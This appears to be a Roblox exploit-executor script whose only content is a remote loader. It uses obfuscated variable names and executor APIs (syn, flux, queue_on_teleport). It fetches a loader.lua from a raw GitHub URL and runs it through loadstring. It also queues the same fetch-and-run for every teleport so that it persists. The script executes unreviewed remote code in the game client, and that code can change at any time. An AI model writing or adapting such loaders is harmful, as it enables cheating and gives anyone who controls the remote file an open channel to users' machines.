local _0x5e = syn and syn.queue_on_teleport or queue_on_teleport or flux and flux.queue_on_teleport
local _0x6f = "https://raw.githubusercontent.com/leos00281-eng/Rbx/refs/heads/main/loader.lua"

if getgenv()._vuln_loaded then return end
getgenv()._vuln_loaded = true

if _0x5e then
    _0x5e([[
        task.spawn(function()
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end
            task.wait(3)
            pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/leos00281-eng/Rbx/refs/heads/main/loader.lua"))()
            end)
        end)
    ]])
end

task.spawn(function()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        loadstring(game:HttpGet(_0x6f))()
    end)
end)
